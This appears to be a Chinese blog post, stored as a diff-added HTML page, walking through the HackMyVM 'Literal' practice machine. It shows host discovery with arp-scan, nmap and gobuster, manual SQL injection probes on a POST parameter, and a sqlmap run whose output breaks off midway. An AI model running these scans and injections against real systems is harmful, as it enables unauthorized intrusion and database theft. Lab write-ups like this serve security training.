@@ -1,0 +1,700 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-Literal | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="难度:easy kali:192.168.56.104 靶机:192.168.56.189 期末周，除了复习啥都想干，那就做个easy的靶机然后去复习 &gt; arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.56.104 Starting arp-scan 1.10.0 with 256">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyVM-Literal">
+<meta property="og:url" content="https://tao0845.github.io/posts/42ff075e/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="难度:easy kali:192.168.56.104 靶机:192.168.56.189 期末周，除了复习啥都想干，那就做个easy的靶机然后去复习 &gt; arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.56.104 Starting arp-scan 1.10.0 with 256">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/23/OPztTr.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/23/OPz4vM.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/23/OPzDcG.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/23/OPzLO1.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/23/OPzGLD.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/23/OPzE7I.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/23/OPz0z6.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/23/OPzcPP.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/23/OPzd9b.png">
+<meta property="article:published_time" content="2024-06-23T03:41:42.766Z">
+<meta property="article:modified_time" content="2024-06-23T05:23:56.945Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/06/23/OPztTr.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">69</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">107</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">web搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83root"><span class="toc-number">4.</span> <span class="toc-text">提权root</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/42ff075e/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-Literal</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-06-23 11:41:42" itemprop="dateCreated datePublished" datetime="2024-06-23T11:41:42+08:00">2024-06-23</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">5.5k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">33m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/sql%E6%B3%A8%E5%85%A5/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">sql注入</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:easy</strong></p>
+<p><strong>kali:192.168.56.104</strong></p>
+<p><strong>靶机:192.168.56.189</strong></p>
+<p>期末周，除了复习啥都想干，那就做个easy的靶机然后去复习</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
+Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.100  08:00:27:1c:a8:4e       PCS Systemtechnik GmbH
+<span class="token number">192.168</span>.56.189  08:00:27:4c:64:e1       PCS Systemtechnik GmbH
+
+<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
+Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">2.021</span> seconds <span class="token punctuation">(</span><span class="token number">126.67</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.189
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-23 <span class="token number">11</span>:45 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.189
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000095s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT   STATE SERVICE
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http
+MAC Address: 08:00:27:4C:64:E1 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.14</span> seconds</code></pre>
+<p>标准的22 80 端口，easy难度直接去web看吧</p>
+<h2 id="web搜集"><a href="#web搜集" class="headerlink" title="web搜集"></a>web搜集</h2><p><img src="https://ooo.0x0.ooo/2024/06/23/OPztTr.png" alt="OPztTr.png" loading="lazy"><br>输入ip解析了域名那就添加hosts</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.56.189 literal.hmv blog.literal.hmv</code></pre>
+<p><img src="https://ooo.0x0.ooo/2024/06/23/OPz4vM.png" alt="OPz4vM.png" loading="lazy"><br>不是熟悉的cms<br>扫一下目录</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://blog.literal.hmv <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Gobuster v3.6
+by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://blog.literal.hmv
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              bak,zip,html,txt,php
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Starting gobuster <span class="token keyword">in</span> directory enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">281</span><span class="token punctuation">]</span>
+/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3325</span><span class="token punctuation">]</span>
+/images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">321</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://blog.literal.hmv/images/<span class="token punctuation">]</span>
+/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">281</span><span class="token punctuation">]</span>
+/login.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1893</span><span class="token punctuation">]</span>
+/register.php         <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">2159</span><span class="token punctuation">]</span>
+/logout.php           <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> login.php<span class="token punctuation">]</span>
+/config.php           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span>
+/fonts                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">320</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://blog.literal.hmv/fonts/<span class="token punctuation">]</span>
+/dashboard.php        <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> login.php<span class="token punctuation">]</span>
+/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">281</span><span class="token punctuation">]</span>
+/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">281</span><span class="token punctuation">]</span>
+/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">281</span><span class="token punctuation">]</span></code></pre>
+<p>有注册和登录界面<br><img src="https://ooo.0x0.ooo/2024/06/23/OPzDcG.png" alt="OPzDcG.png" loading="lazy"><br>随便注册一个号看看，好卡好卡<br><img src="https://ooo.0x0.ooo/2024/06/23/OPzLO1.png" alt="OPzLO1.png" loading="lazy"><br>去这个蓝色的链接看一下</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">next_projects_to_do.php</code></pre>
+<p><img src="https://ooo.0x0.ooo/2024/06/23/OPzGLD.png" alt="OPzGLD.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/23/OPzE7I.png" alt="OPzE7I.png" loading="lazy"><br>输入个Done查询然后抓包，测试发现<code>Done&#39;#</code>和<code>Done</code>回显一样，并且<code>Done&#39;</code>报错，说明存在sql注入，用sqlmap跑一下</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-l</span> a.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--dbs</span>  
+        ___
+       __H__                                                                                                                                                                                                                                 
+ ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.2<span class="token comment">#stable&#125;                                                                                                                                                                                                     </span>
+<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">)</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |                                                                                                                                                                                                                    
+|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                    
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">12</span>:22:25 /2024-06-23/
+
+<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> sqlmap parsed <span class="token number">1</span> <span class="token punctuation">(</span>parameter unique<span class="token punctuation">)</span> requests from the targets list ready to be tested
+<span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> URL:
+GET http://blog.literal.hmv:80/next_projects_to_do.php
+Cookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>ccbhsfj6hk03lc0ddern711k9n
+POST data: sentence-query<span class="token operator">=</span>Done
+<span class="token keyword">do</span> you want to <span class="token builtin class-name">test</span> this URL? <span class="token punctuation">[</span>Y/n/q<span class="token punctuation">]</span>
+<span class="token operator">></span> Y
+<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing URL <span class="token string">'http://blog.literal.hmv:80/next_projects_to_do.php'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> using <span class="token string">'/root/.local/share/sqlmap/output/results-06232024_1222pm.csv'</span> as the CSV results <span class="token function">file</span> <span class="token keyword">in</span> multiple targets mode
+<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
+<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> the target URL content is stable
+<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL content is stable
+<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> POST parameter <span class="token string">'sentence-query'</span> is dynamic
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'sentence-query'</span> appears to be dynamic
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> heuristic <span class="token punctuation">(</span>basic<span class="token punctuation">)</span> <span class="token builtin class-name">test</span> shows that POST parameter <span class="token string">'sentence-query'</span> might not be injectable
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">for</span> SQL injection on POST parameter <span class="token string">'sentence-query'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'AND boolean-based blind - WHERE or HAVING clause'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'sentence-query'</span> appears to be <span class="token string">'AND boolean-based blind - WHERE or HAVING clause'</span> injectable <span class="token punctuation">(</span>with <span class="token parameter variable">--string</span><span class="token operator">=</span><span class="token string">"11"</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> heuristic <span class="token punctuation">(</span>extended<span class="token punctuation">)</span> <span class="token builtin class-name">test</span> shows that the back-end DBMS could be <span class="token string">'MySQL'</span> 
+it looks like the back-end DBMS is <span class="token string">'MySQL'</span><span class="token builtin class-name">.</span> Do you want to skip <span class="token builtin class-name">test</span> payloads specific <span class="token keyword">for</span> other DBMSes? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
+<span class="token keyword">for</span> the remaining tests, <span class="token keyword">do</span> you want to include all tests <span class="token keyword">for</span> <span class="token string">'MySQL'</span> extending provided level <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> and risk <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> values? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>
